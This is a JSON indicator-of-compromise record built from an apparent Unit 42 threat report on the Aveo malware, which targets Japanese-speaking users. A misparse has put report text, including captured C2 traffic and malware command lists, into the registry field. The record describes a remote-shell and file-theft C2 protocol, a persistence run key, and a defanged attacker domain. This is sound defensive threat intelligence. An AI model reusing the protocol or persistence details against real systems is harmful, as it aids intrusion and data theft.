{"rule_id": 35, "name": "unit42-aveo-malware-family-targets-japanese-speaking-users", "description": "-", "references": [], "File_Names": ["malware.exe", "mshelp32.exe", "jhmiyh.ny", "8101c298a33d91a985a5150d0254cf426601e4632250f5a03ddac39375e7fb4d.xls", "MMC.exe", "8101c298a33d91a985a5150d0254cf426601e4632250f5a03ddac39375e7fb4d.exe", "setting32.ini", "jack.ondo", "CAVE\u7814\u7a76\u4f1a\u53c2\u52a0\u8005.xls"], "MD5_Hashes": [], "SHA1_Hashes": [], "SHA256_Hashes": ["8101c298a33d91a985a5150d0254cf426601e4632250f5a03ddac39375e7fb4d", "9dccfdd2a503ef8614189225bbbac11ee6027590c577afcaada7e042e18625e2"], "Registry_Entries": ["HKCU\\software\\microsoft\\windows\\currentversion\\run\\msnetbridge\n\nA command handler loop is then entered, where Aveo will accept commands from the remote\n\nC2. While the Aveo malware family awaits a response, it will perform sleep delays of randomly\n\nchosen intervals between 0 and 3276 milliseconds. Should the C2 server respond with \u2018toyota\u2019,\n\nit will set that interval to 60 seconds. Aveo accepts the following commands, shown with their\n\nassociated function.\n\n1 : Execute command in interactive shell\n\n2 : Get file attributes\n\n3 : Write file\n\n4 : Read file\n\n5 : List drives\n\n6 : Execute DIR command against path\n\nThe following example request demonstrates the C2 server sending the \u2018ipconfig\u2019 command to\n\nthe Aveo malware.\n\nC2 Request\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\nGET /index.php?id=35468&1=niBo9x/bFG4- HTTP/1.1\nAccept: */*\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET \nHost: snoozetime[.]info\nCache-Control: no-cache\n\nHTTP/1.0 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 11\nServer: Werkzeug/0.11.10 Python/2.7.5\nDate: Wed, 10 Aug 2016 16:00:11 GMT\n\n\\xca89\\xb4J\\x82B?\\xa5\\x05\\xe8\n\n[Decrypted] \n1 ipconfig\n\nAveo Response\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\nPOST /index.php?id=35469&1=niBo9x/bFG4- HTTP/1.1\nAccept: */*\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET \nHost: snoozetime[.]info\nContent-Length: 1006\nCache-Control: no-cache\n\n\\xca\\x38\\x39\\xb4\\x4a\\x82\\x42\\x3f\\xa5\\x05\\xe8\\xdb\\xda\\x74\\x8b\\x79\\x39\n[Truncated]\n\n[Decrypted]\n1 ipconfig\n\nWindows IP Configuration\n\nEthernet adapter Bluetooth Network Connection:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n[Truncated]\n\nAveo shares a number of characteristics with FormerFirstRAT, including encryption routines,\n\ncode reuse, and similarities in C2 functionality. Aveo is far from the most sophisticated malware\n\nfamily around. As witnessed in the previously discussed FormerFirstRAT sample, this related\n\nmalware family also looks to be targeting Japanese speaking users. Using a self-extracting\n\nWinRAR file, the malware drops a decoy document, a copy of the Aveo malware, and a cleanup\n\nscript.\n\nPalo Alto Networks customers are protected from this threat in the following ways:\n\n \n \n \n \n \n \n \n \n \n\fAn AutoFocus tag has been created to track and monitor this threat\n\nWildFire classifies Aveo samples as malicious\n\nC2 domains listed in this report are blocked through Threat Prevention.\n\nSHA256 Hashes\n\n9dccfdd2a503ef8614189225bbbac11ee6027590c577afcaada7e042e18625e2\n\n8101c298a33d91a985a5150d0254cf426601e4632250f5a03ddac39375e7fb4d\n\nC2 Domains\n\nsnoozetime[.]info\n\nRegistry Keys\n\nHKCU\\software\\microsoft\\windows\\currentversion\\run\\msnetbridge\n\nFile Paths\n\n%APPDATA%\\MMC\\MMC.exe\n\n%TEMP%\\MMC\\MMC.exe\n\nName *\n\nEmail *\n\nWebsite\n\nPost Comment\n\nPrivacy Policy   Legal Notices   Site Index   Subscriptions\n\nCopyright \u00a9 2007-2013 Palo Alto Networks\n\n\f"], "URLs": [], "weight": 0.0}